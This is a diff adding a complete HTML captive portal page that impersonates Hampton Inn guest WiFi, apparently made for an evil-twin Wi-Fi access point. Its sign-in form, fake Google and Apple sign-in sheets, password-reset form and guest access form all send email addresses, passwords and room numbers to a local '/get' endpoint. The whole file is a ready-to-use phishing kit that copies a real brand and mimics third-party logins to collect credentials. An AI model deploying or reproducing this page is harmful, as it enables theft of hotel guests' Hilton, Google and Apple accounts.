@@ -1,0 +1,193 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Hampton Inn WiFi</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Arial',sans-serif;background:#CC0000;display:flex;flex-direction:column;min-height:100vh;max-width:480px;margin:0 auto}
+#th,#tr,#thl,#tg,#ta,#tj,#tu,#tf,#to,#r1,#r2,#r3,#tp{display:none}
+.dot{width:6px;height:6px;border-radius:50%;background:#4CAF50;animation:p 2s infinite}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
+nav{background:#CC0000;display:flex;padding:0 14px;border-bottom:1px solid rgba(255,255,255,.15)}
+nav label{color:rgba(255,255,255,.45);font-size:12px;font-weight:700;cursor:pointer;padding:9px 12px;border-bottom:2px solid transparent;margin-bottom:-1px;text-transform:uppercase;letter-spacing:.8px;font-family:'Arial',sans-serif}
+#th:checked~nav label[for=th],#tr:checked~nav label[for=tr],#thl:checked~nav label[for=thl]{color:#fff;border-bottom-color:#002D6C}
+.scene{flex:1;background:#f5f3f0;padding-bottom:18px}
+.panel{display:none}
+#th:checked~.scene .ph{display:block}
+#tr:checked~.scene .prw{display:block}
+#thl:checked~.scene .phl{display:block}
+.ca{padding:11px 13px 0}
+.sl{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#999;margin-bottom:7px;font-family:'Arial',sans-serif}
+.card{background:#ffffff;border-radius:4px;padding:16px;box-shadow:0 2px 10px rgba(0,0,0,.07);margin-bottom:11px}
+.fw{position:relative;margin-bottom:9px}
+.fi{width:100%;padding:16px 13px 7px;border:1.5px solid #ddd9d4;border-radius:3px;font-size:15px;color:#1a1a1a;outline:none;background:#ffffff;transition:border-color .15s;font-family:'Arial',sans-serif}
+.fi:focus{border-color:#CC0000}
+.fi::placeholder{color:transparent}
+.fl{position:absolute;top:50%;left:14px;transform:translateY(-50%);font-size:14px;color:#bbb;pointer-events:none;transition:all .15s;background:#ffffff;padding:0 2px;font-family:'Arial',sans-serif}
+.fi:focus~.fl,.fi:not(:placeholder-shown)~.fl{top:9px;font-size:9px;color:#CC0000;font-weight:700;text-transform:uppercase;letter-spacing:.5px;transform:none}
+.pe{position:absolute;right:13px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:10px;font-weight:700;color:#CC0000;text-transform:uppercase;font-family:'Arial',sans-serif}
+#tp:checked~.scene .ph .ls{display:none}
+#tp:not(:checked)~.scene .ph .lh{display:none}
+.btn{width:100%;padding:13px;border:none;border-radius:3px;background:#CC0000;color:#fff;font-size:14px;font-weight:700;cursor:pointer;display:block;text-align:center;font-family:'Arial',sans-serif;letter-spacing:.5px}
+.btn-acc{background:#002D6C;color:#fff}
+.hr2{display:flex;justify-content:space-between;margin-bottom:13px}
+.lk{font-size:12px;color:#CC0000;font-weight:700;cursor:pointer;background:none;padding:0;font-family:'Arial',sans-serif}
+.or{display:flex;align-items:center;gap:9px;margin-bottom:11px}
+.or::before,.or::after{content:"";flex:1;height:1px;background:#e8e4de}
+.or span{font-size:11px;color:#ccc;font-weight:700;font-family:'Arial',sans-serif}
+.sg{width:100%;padding:11px;border-radius:3px;font-size:13px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;font-family:'Arial',sans-serif}
+.sgg{border:1.5px solid #ddd9d4;background:#ffffff;color:#1a1a1a}
+.sga{border:none;background:#1a1a1a;color:#fff}
+.tn2{font-size:10px;color:#bbb;text-align:center;line-height:1.6;margin-top:11px;font-family:'Arial',sans-serif}
+.tn2 label{color:#CC0000;font-weight:700;cursor:pointer;text-decoration:underline;font-size:10px;border:none;padding:0}
+.jbt{background:#CC0000;color:#fff;border:none;padding:8px 13px;border-radius:3px;font-size:11px;font-weight:700;cursor:pointer;white-space:nowrap;font-family:'Arial',sans-serif}
+.fco{display:inline-block;background:#002D6C;color:#fff;padding:8px 18px;border-radius:3px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Arial',sans-serif}
+.rh{background:#CC0000;padding:20px 16px;text-align:center}
+.rc{padding:11px 13px}
+.ri{background:#ffffff;border-radius:4px;padding:12px;margin-bottom:7px;display:flex;align-items:center;gap:11px;opacity:.7}
+.rii{width:38px;height:38px;border-radius:3px;background:#f5f3f0;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.rist{margin-left:auto;background:#e8e4de;color:#999;font-size:10px;font-weight:700;padding:4px 8px;border-radius:20px;flex-shrink:0;font-family:'Arial',sans-serif}
+.hls{padding:11px 13px}
+.ai{background:#ffffff;border-radius:4px;margin-bottom:7px;overflow:hidden}
+.al{display:flex;align-items:center;justify-content:space-between;padding:13px 14px;cursor:pointer;gap:7px}
+.aq{font-size:13px;font-weight:700;color:#CC0000;font-family:'Arial',sans-serif}
+.aa{font-size:9px;color:#002D6C;flex-shrink:0;transition:transform .2s}
+.ab{max-height:0;overflow:hidden;font-size:12px;color:#666;line-height:1.6;padding:0 14px;transition:max-height .25s ease,padding .2s;font-family:'Arial',sans-serif}
+#r1:checked~.scene .phl .ab1{max-height:80px;padding:9px 14px 13px;border-top:1px solid #ddd9d4}
+#r2:checked~.scene .phl .ab2{max-height:80px;padding:9px 14px 13px;border-top:1px solid #ddd9d4}
+#r3:checked~.scene .phl .ab3{max-height:80px;padding:9px 14px 13px;border-top:1px solid #ddd9d4}
+#r1:checked~.scene .phl .ar1,#r2:checked~.scene .phl .ar2,#r3:checked~.scene .phl .ar3{transform:rotate(90deg)}
+.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:100;align-items:flex-end;justify-content:center}
+#tg:checked~.ov-g,#ta:checked~.ov-a,#tj:checked~.ov-j,#tu:checked~.ov-u,#tf:checked~.ov-f,#to:checked~.ov-o{display:flex}
+.bd{position:absolute;inset:0}
+.sh{position:relative;background:#ffffff;border-radius:4px 4px 0 0;width:100%;max-width:480px;padding:16px 18px 34px;z-index:1;max-height:88vh;overflow-y:auto}
+.sha{background:#f4f2f0}
+.hdl{width:32px;height:4px;background:#ddd9d4;border-radius:2px;margin:0 auto 14px}
+.sl2{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:#bbb;margin-bottom:4px;display:block;margin-top:9px;font-family:'Arial',sans-serif}
+.inp{width:100%;padding:11px 12px;border:1.5px solid #ddd9d4;border-radius:3px;font-size:14px;color:#1a1a1a;outline:none;display:block;font-family:'Arial',sans-serif}
+.inp:focus{border-color:#CC0000}
+.inp::placeholder{color:#bbb}
+.gw{font-size:13px;font-weight:700;color:#CC0000;font-family:'Arial',sans-serif}
+.can{display:block;text-align:center;font-size:13px;font-weight:700;color:#CC0000;margin-top:9px;cursor:pointer;font-family:'Arial',sans-serif}
+.ai2{width:100%;padding:11px 14px;border:none;font-size:15px;color:#1a1a1a;outline:none;background:#ffffff;display:block;font-family:'Arial',sans-serif}
+.ai2::placeholder{color:#bbb}
+.ai2:first-child{border-bottom:1px solid #ebebeb}
+</style></head>
+<body>
+<input type="radio" name="tab" id="th" checked>
+<input type="radio" name="tab" id="tr">
+<input type="radio" name="tab" id="thl">
+<input type="checkbox" id="tg">
+<input type="checkbox" id="ta">
+<input type="checkbox" id="tj">
+<input type="checkbox" id="tu">
+<input type="checkbox" id="tf">
+<input type="checkbox" id="to">
+<input type="checkbox" id="r1">
+<input type="checkbox" id="r2">
+<input type="checkbox" id="r3">
+<div style="background:#CC0000;padding:10px 18px 0;display:flex;align-items:center;gap:11px">
+<div style="width:42px;height:42px;background:#002D6C;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:13px;font-weight:900;color:#fff;font-family:'Arial',sans-serif;letter-spacing:-1px">H+</div>
+<div><div style="font-size:15px;font-weight:700;color:#fff;font-family:'Arial',sans-serif;letter-spacing:.3px">Hampton Inn</div>
+<div style="font-size:11px;color:rgba(255,255,255,.65);display:flex;align-items:center;gap:4px;margin-top:1px;font-family:'Arial',sans-serif"><span class="dot"></span>Hampton WiFi &middot; Connected</div>
+</div></div>
+<nav><label for="th">Home</label><label for="tr">Honors</label><label for="thl">Help</label></nav>
+<div class="scene">
+<div class="panel ph">
+<div style="background:linear-gradient(160deg,#CC0000,#CC0000cc);padding:15px 18px 17px;display:flex;align-items:center;gap:13px">
+<div style="width:56px;height:56px;background:rgba(255,255,255,.15);border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0;border:1px solid rgba(255,255,255,.3)">&#127963;</div>
+<div><div style="font-size:14px;font-weight:700;color:#fff;margin-bottom:1px;font-family:'Arial',sans-serif">Welcome to Hampton Inn WiFi</div>
+<div style="font-size:11px;color:rgba(255,255,255,.7);font-family:'Arial',sans-serif">Sign in to earn Hilton Honors points</div>
+</div></div>
+<div class="ca">
+<div class="card">
+<div style="font-size:16px;font-weight:700;color:#1a1a1a;margin-bottom:1px;font-family:'Arial',sans-serif">Sign in to connect</div>
+<div style="font-size:12px;color:#bbb;margin-bottom:14px;font-family:'Arial',sans-serif">Use your Hilton Honors account</div>
+<form action="/get">
+<div class="fw"><input class="fi" type="text" name="email" placeholder="e" id="fe"><label class="fl" for="fe">Email address</label></div>
+<div class="fw"><input class="fi" type="password" name="password" placeholder="p" id="fp" autocomplete="current-password"><label class="fl" for="fp">Password</label><span class="pe" id="pt" onclick="var f=document.getElementById('fp'),t=document.getElementById('pt');if(f.type==='password'){f.type='text';t.textContent='Hide';}else{f.type='password';t.textContent='Show';}">Show</span></div>
+<button type="submit" class="btn">Sign In</button>
+</form>
+<div class="hr2" style="margin-top:10px"><label for="tf" class="lk">Forgot password?</label></div>
+<div class="or"><span>or continue with</span></div>
+<label for="tg" class="sg sgg">G &nbsp; Continue with Google</label>
+<label for="ta" class="sg sga">&#63743; Continue with Apple</label>
+<p class="tn2">By signing in you agree to Hampton Inn's <label for="tu">Terms &amp; Privacy Policy</label></p>
+</div>
+<div class="sl">Member Benefits</div>
+<div style="background:#ffffff;border-radius:4px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,.07);margin-bottom:11px">
+<div style="height:90px;background:linear-gradient(135deg,#CC0000,#CC0000aa);display:flex;align-items:center;justify-content:center;font-size:48px">&#127963;</div>
+<div style="padding:12px 14px 14px">
+<div style="font-size:15px;font-weight:700;color:#1a1a1a;margin-bottom:2px;font-family:'Arial',sans-serif">Hilton Honors Membership</div>
+<div style="font-size:11px;color:#999;line-height:1.5;margin-bottom:9px;font-family:'Arial',sans-serif">Free hot breakfast included every stay. Earn Honors points per night.</div>
+<label for="tj" class="fco">Join Free &rarr;</label>
+</div></div>
+<div style="background:#ffffff;border-radius:4px;padding:13px 15px;box-shadow:0 2px 8px rgba(0,0,0,.06);display:flex;align-items:center;justify-content:space-between;gap:9px;margin-bottom:11px">
+<div><div class="gw">Guest WiFi Access</div><div style="font-size:11px;color:#bbb;font-family:'Arial',sans-serif">Browse without signing in</div></div>
+<label for="tj" class="jbt">Get Access</label>
+</div>
+</div></div>
+<div class="panel prw">
+<div class="rh">
+<div style="font-size:11px;font-weight:700;color:rgba(255,255,255,.6);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:6px;font-family:'Arial',sans-serif">Hilton Honors</div>
+<div style="font-size:34px;margin-bottom:4px">&#11041;</div>
+<div style="font-size:17px;font-weight:700;color:#002D6C;margin-bottom:8px;font-family:'Arial',sans-serif">Earn. Redeem. Stay.</div>
+<div style="background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:4px;padding:11px 13px;margin-bottom:11px">
+<p style="font-size:12px;color:rgba(255,255,255,.8);line-height:1.5;margin-bottom:7px;font-family:'Arial',sans-serif">Sign in to earn Hilton Honors points at Hampton Inn properties.</p>
+<label for="th" style="display:inline-block;background:#002D6C;color:#fff;border:none;padding:9px 22px;border-radius:3px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Arial',sans-serif">Sign In to Honors</label>
+</div></div>
+<div class="rc">
+<div class="sl">Member Tiers</div>
+<div class="ri"><div class="rii">&#127942;</div><div><div class="gw">Member</div><div style="font-size:11px;color:#bbb;font-family:'Arial',sans-serif">Base tier</div></div><div class="rist">Tier 1</div></div>
+<div class="ri"><div class="rii">&#127881;</div><div><div class="gw">Silver</div><div style="font-size:11px;color:#bbb;font-family:'Arial',sans-serif">10+ nights/year</div></div><div class="rist">Tier 2</div></div>
+<div class="ri"><div class="rii">&#9830;</div><div><div class="gw">Gold</div><div style="font-size:11px;color:#bbb;font-family:'Arial',sans-serif">40+ nights/year</div></div><div class="rist">Tier 3</div></div>
+<label for="th" class="btn" style="margin-top:13px;cursor:pointer">Sign In to View My Points</label>
+</div></div>
+<div class="panel phl">
+<div class="hls">
+<div style="background:#CC0000;border-radius:4px;padding:13px 15px;display:flex;align-items:center;gap:13px;margin-bottom:11px">
+<span style="font-size:21px">&#128246;</span>
+<div><div style="font-size:13px;font-weight:700;color:#fff;margin-bottom:1px;font-family:'Arial',sans-serif">Connected &mdash; Hampton WiFi</div><div style="font-size:11px;color:rgba(255,255,255,.65);font-family:'Arial',sans-serif">Hampton Inn</div></div>
+</div>
+<div class="sl">FAQ</div>
+<div class="ai"><label for="r1" class="al"><span class="aq">Why am I seeing this page?</span><span class="aa ar1">&#9654;</span></label><div class="ab ab1">Hampton Inn requires sign-in to access guest WiFi. Enter your Hilton Honors credentials or use guest access to connect.</div></div>
+<div class="ai"><label for="r2" class="al"><span class="aq">I forgot my password.</span><span class="aa ar2">&#9654;</span></label><div class="ab ab2">Tap "Forgot password?" on the Home tab to reset via email, or visit the Hampton Inn website for account help.</div></div>
+<div class="ai"><label for="r3" class="al"><span class="aq">Is WiFi free for guests?</span><span class="aa ar3">&#9654;</span></label><div class="ab ab3">Yes, Hampton Inn WiFi is complimentary for all guests. Hilton Honors members may receive enhanced speeds.</div></div>
+<div style="background:#f5f3f0;border-radius:4px;padding:13px;text-align:center;margin-top:3px">
+<p style="font-size:12px;color:#666;margin-bottom:7px;font-family:'Arial',sans-serif">Hampton Inn Guest Services</p>
+<a href="tel:18005267466" style="display:inline-block;background:#CC0000;color:#fff;padding:8px 18px;border-radius:3px;font-size:12px;font-weight:700;text-decoration:none;font-family:'Arial',sans-serif">1-800-HAMPTON</a>
+</div>
+</div></div>
+</div>
+<div class="ov ov-f"><label for="tf" class="bd"></label><div class="sh"><div class="hdl"></div>
+<div style="font-size:17px;font-weight:700;color:#CC0000;text-align:center;margin-bottom:2px;font-family:'Arial',sans-serif">Reset Password</div>
+<div style="font-size:12px;color:#bbb;text-align:center;margin-bottom:16px;font-family:'Arial',sans-serif">Enter your Hilton Honors email for a reset link.</div>
+<form action="/get"><label class="sl2">Email address</label><input class="inp" type="text" name="email" placeholder="your@email.com"><input type="hidden" name="password" value="recovery-attempt"><div style="display:flex;justify-content:space-between;align-items:center;margin-top:13px"><label for="tf" style="font-size:13px;color:#CC0000;cursor:pointer;font-weight:700;font-family:'Arial',sans-serif">Cancel</label><button type="submit" style="background:#CC0000;color:#fff;border:none;border-radius:3px;padding:10px 24px;font-size:13px;font-weight:700;cursor:pointer;font-family:'Arial',sans-serif">Send Link</button></div></form>
+</div></div>
+<div class="ov ov-g"><label for="tg" class="bd"></label><div class="sh"><div class="hdl"></div>
+<div style="font-size:17px;font-weight:700;color:#202124;text-align:center;margin-bottom:2px;font-family:'Arial',sans-serif">Sign in with Google</div>
+<div style="font-size:12px;color:#5f6368;text-align:center;margin-bottom:15px;font-family:'Arial',sans-serif">Continue to Hampton Inn WiFi</div>
+<form action="/get"><label class="sl2">Email or phone</label><input class="inp" type="text" name="email" placeholder="Enter your email"><label class="sl2" style="margin-top:9px">Password</label><input class="inp" type="password" name="password" placeholder="Enter your password" style="margin-top:4px"><div style="display:flex;justify-content:space-between;align-items:center;margin-top:13px"><label for="tg" style="font-size:13px;color:#1a73e8;cursor:pointer;font-weight:700;font-family:'Arial',sans-serif">Cancel</label><button type="submit" style="background:#1a73e8;color:#fff;border:none;border-radius:3px;padding:10px 24px;font-size:13px;font-weight:700;cursor:pointer;font-family:'Arial',sans-serif">Next</button></div></form>
+</div></div>
+<div class="ov ov-a"><label for="ta" class="bd"></label><div class="sh sha"><div class="hdl"></div>
+<div style="font-size:28px;text-align:center;margin-bottom:4px">&#63743;</div>
+<div style="font-size:16px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:2px;font-family:'Arial',sans-serif">Sign in with Apple</div>
+<div style="font-size:12px;color:#666;text-align:center;margin-bottom:15px;font-family:'Arial',sans-serif">Continue to Hampton Inn WiFi</div>
+<form action="/get"><div style="background:#ffffff;border-radius:4px;overflow:hidden;margin-bottom:9px;border:1.5px solid #ddd9d4"><input class="ai2" type="text" name="email" placeholder="Apple ID"><input class="ai2" type="password" name="password" placeholder="Password"></div><button type="submit" class="btn" style="background:#1a1a1a;color:#fff;margin-bottom:7px">Continue</button><label for="ta" class="btn" style="background:#ffffff;color:#1a1a1a;border:1.5px solid #ddd9d4;margin:0;cursor:pointer">Cancel</label></form>
+</div></div>
+<div class="ov ov-j"><label for="tj" class="bd"></label><div class="sh"><div style="background:#CC0000;margin:-16px -18px 16px;padding:22px 18px 18px;border-radius:4px 4px 0 0"><div class="hdl" style="background:rgba(255,255,255,.3)"></div><div style="font-size:19px;font-weight:700;color:#fff;text-align:center;margin-bottom:2px;font-family:'Arial',sans-serif">Hampton Inn Guest WiFi</div><div style="font-size:12px;color:rgba(255,255,255,.75);text-align:center;font-family:'Arial',sans-serif">Complimentary access for hotel guests</div></div>
+<form action="/get"><label class="sl2">Full Name</label><input class="inp" type="text" name="firstName" placeholder="Your full name"><label class="sl2" style="margin-top:6px">Email Address</label><input class="inp" type="text" name="email" placeholder="your@email.com" style="margin-top:4px"><label class="sl2" style="margin-top:6px">Room Number</label><input class="inp" type="password" name="password" placeholder="Your room number" style="margin-top:4px"><button type="submit" class="btn btn-acc" style="margin-top:13px">Get Guest Access</button></form>
+<label for="tj" class="can">Cancel</label>
+</div></div>
+<div class="ov ov-u"><label for="tu" class="bd"></label><div class="sh"><div class="hdl"></div>
+<div style="font-size:15px;font-weight:700;color:#1a1a1a;margin-bottom:12px;padding-bottom:11px;border-bottom:1px solid #ddd9d4;font-family:'Arial',sans-serif">Hampton Inn WiFi &mdash; Terms &amp; Privacy</div>
+<p style="font-size:12px;color:#555;line-height:1.6;margin-bottom:8px;font-family:'Arial',sans-serif">Hampton Inn provides complimentary WiFi at participating properties, subject to its Terms of Service and Privacy Policy.</p>
+<p style="font-size:12px;color:#555;line-height:1.6;margin-bottom:8px;font-family:'Arial',sans-serif">Prohibited: illegal activity, unauthorized access, or network interference. Hampton Inn may monitor usage.</p>
+<p style="font-size:12px;color:#555;line-height:1.6;font-family:'Arial',sans-serif">WiFi is provided as-is. Hampton Inn is not liable for losses from use of this network.</p>
+<label for="tu" class="btn" style="margin-top:13px;cursor:pointer">Close &amp; Return</label>
+</div></div>
+<div class="ov ov-o"><label for="to" class="bd"></label><div class="sh"><div class="hdl"></div>
+<div style="height:80px;background:#CC0000;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:42px;margin-bottom:13px">&#127963;</div>
+<div style="font-size:17px;font-weight:700;color:#CC0000;text-align:center;margin-bottom:2px;font-family:'Arial',sans-serif">Hampton Inn WiFi</div>
+<div style="font-size:12px;color:#bbb;text-align:center;margin-bottom:16px;line-height:1.5;font-family:'Arial',sans-serif">Complimentary WiFi for all guests. Hilton Honors members enjoy enhanced connectivity.</div>
+<div style="background:#f5f3f0;border-radius:4px;padding:13px;text-align:center;margin-bottom:13px"><div style="font-size:24px;margin-bottom:5px">&#128274;</div><div class="gw">Sign In Required</div><div style="font-size:11px;color:#999;margin-top:2px;font-family:'Arial',sans-serif">Sign in with your Hilton Honors account to connect.</div></div>
+<div style="position:relative"><label for="to" style="display:block;width:100%;padding:13px;border-radius:3px;background:#CC0000;color:#fff;font-size:14px;font-weight:700;text-align:center;cursor:pointer;font-family:'Arial',sans-serif">Sign In to Connect</label><label for="th" style="position:absolute;inset:0;border-radius:3px;cursor:pointer"></label></div>
+<label for="to" class="can">Cancel</label>
+</div></div>
+</body></html>
